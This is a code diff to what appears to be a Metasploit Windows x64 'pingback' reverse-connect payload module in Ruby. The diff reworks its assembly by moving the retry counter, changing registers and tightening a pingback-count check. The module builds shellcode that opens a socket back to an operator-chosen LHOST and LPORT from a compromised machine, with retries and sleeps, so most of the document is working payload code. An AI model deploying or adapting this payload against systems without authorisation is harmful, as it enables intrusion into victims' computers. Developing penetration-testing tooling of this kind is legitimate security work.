@@ -34,19 +34,13 @@ module MetasploitModule
       # 22 -> "0x00,0x16"
       # 4444 -> "0x11,0x5c"
       encoded_port = [datastore['LPORT'].to_i,2].pack("vn").unpack("N").first
-      #encoded_port = convert_input(datastore['LPORT'], 4)
 
-      # ::1 -> "0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01"
-      # dead:beef:2::1009 -> "0xde,0xad,0xbe,0xef,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x09"
       encoded_host = Rex::Socket.addr_aton(datastore['LHOST']||"127.127.127.127").unpack("V").first
-      #encoded_host = convert_input(IPAddr.new(datastore['LHOST'], Socket::AF_INET).to_i, 32)
       retry_count  = [datastore['ReverseConnectRetries'].to_i, 1].max
       pingback_count = datastore['PingbackTries']
       pingback_sleep = datastore['PingbackSleep']
 
       puts("Generating pingback single payload")
-      #encoded_port = [opts[:port].to_i,2].pack("vn").unpack("N").first
-      #encoded_host = Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
       encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
       pingback_uuid ||= generate_pingback_uuid
       puts("UUID in send_pingback: " + pingback_uuid.to_s.gsub("-", ""))
@@ -181,12 +175,12 @@ module MetasploitModule
           call rbp                ; WSAStartup( 0x0101, &WSAData );
 
         ; stick the retry count on the stack and store it
-          push #{retry_count}     ; retry counter
-          pop r14
           push #{(pingback_count)} 
-          pop r11
+          pop r15
 
         create_socket:
+          push #{retry_count}     ; retry counter
+          pop r14
         ; perform the call to WSASocketA...
           push rax                ; if we succeed, rax wil be zero, push zero for the flags param.
           push rax                ; push null for reserved parameter
@@ -241,12 +235,12 @@ module MetasploitModule
           mov r10, #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
           call rbp               ; call closesocket
         ^
-      if pingback_count
+      if pingback_count > 0
         asm << %Q^
           sleep:
-            test r11, r11            ; check pingback retry counter
+            test r15, r15         ; check pingback retry counter
             jz exitfunk           ; bail if we are at 0
-            dec r11               ;decrement the pingback retry counter
+            dec r15               ;decrement the pingback retry counter
             push #{(pingback_sleep*1000).to_s}            ; 10 seconds
             pop rcx               ; set the sleep function parameter
             mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
